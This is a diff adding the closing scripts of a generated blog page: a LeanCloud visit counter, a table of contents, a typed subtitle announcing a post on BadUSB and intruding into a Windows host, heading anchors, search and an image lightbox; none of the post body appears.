+    var app_id = '3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz'
+    var app_key = 'neatHwvRMvcDYnNxMBbGGFlP'
+    var server_url = 'https://3vytx5qf.lc-cn-n1-shared.com'
+
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': app_id,
+            'X-LC-Key': app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+
+      addCount(Counter);
+    }
+
+    var api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${ app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(resp => resp.json())
+        .then(({api_server}) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    function typing(id, hitokoto){
+      var typed = new Typed('#' + id, {
+        strings: [
+          '  ',
+          hitokoto + "&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        loop: false,
+      });
+      typed.stop();
+      $(document).ready(function () {
+        $(".typed-cursor").addClass("h2");
+        typed.start();
+      });
+    };
+      
+  
+    typing("subtitle", "badusb的学习记录&入侵windows主机")
+  
+  </script>
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
